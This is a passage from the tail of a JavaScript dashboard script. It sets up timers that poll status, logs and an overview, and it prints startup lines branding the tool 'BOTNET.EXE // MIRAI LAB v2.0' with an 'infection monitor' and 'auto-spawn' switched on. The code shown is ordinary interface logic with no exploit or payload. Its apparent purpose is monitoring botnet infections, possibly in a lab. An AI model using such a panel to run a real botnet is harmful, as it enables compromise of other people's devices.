        if(!st.running&&st.exit_code!==null&&st.exit_code!==undefined) clearInterval(iv);
      }catch{}
    },5000);
  }catch(e){
    log.textContent=">[ERR] "+e.message;
    toast("FETCH ERR",true);
  }
});

/* ---- INIT ------------------------------------------------ */
window.addEventListener("resize",()=>{resize();});
resize();
buildNodeList();
drawFrame();
pollStatus(); pollLogs(); pollOverview();
setInterval(pollStatus,   POLL_MS);
setInterval(pollLogs,     LOG_POLL_MS);
setInterval(pollOverview, 15000);
termLog("[SYS] BOTNET.EXE // MIRAI LAB v2.0 // "+new Date().toLocaleString(),"sys");
termLog("[SYS] INFECTION.MONITOR: active // auto-spawn: ON","sys");
termLog("[SYS] "+Object.keys(COUNTRY_BOUNDS).join(" ")+" [ WATCHING ]","sys");
